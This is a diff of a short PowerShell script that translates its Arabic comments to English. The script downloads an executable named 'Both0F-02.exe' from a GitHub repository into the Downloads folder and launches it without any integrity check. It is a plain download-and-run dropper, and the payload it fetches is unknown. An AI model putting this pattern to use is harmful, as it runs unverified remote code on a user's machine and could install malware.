@@ -1,20 +1,20 @@
-# عنوان URL المباشر للملف على GitHub
-$url = "https://github.com/Mouted/Hos/raw/main/Both0F-02"
+# Direct URL to the file on GitHub
+$url = "https://github.com/Mouted/Hos/raw/main/Both0F-02.exe"
 
-# المسار الذي سيتم حفظ الملف فيه على جهازك (في مجلد التنزيلات )
-$destination = "$env:USERPROFILE\Downloads\Both0F-02"
+# Destination path on your machine (in the Downloads folder )
+$destination = "$env:USERPROFILE\Downloads\Both0F-02.exe"
 
-# رسالة للمستخدم
-Write-Host "بدء تنزيل الملف من الرابط..."
+# Message to the user
+Write-Host "Starting file download..."
 
-# تنزيل الملف
+# Download the file
 Invoke-WebRequest -Uri $url -OutFile $destination
 
-# رسالة للمستخدم
-Write-Host "اكتمل التنزيل. سيتم الآن تشغيل الملف..."
+# Message to the user
+Write-Host "Download complete. Now running the file..."
 
-# تشغيل الملف الذي تم تنزile
+# Run the downloaded file
 Start-Process -FilePath $destination
 
-# رسالة للمستخدم
-Write-Host "تم تشغيل الملف بنجاح."
+# Message to the user
+Write-Host "File executed successfully."
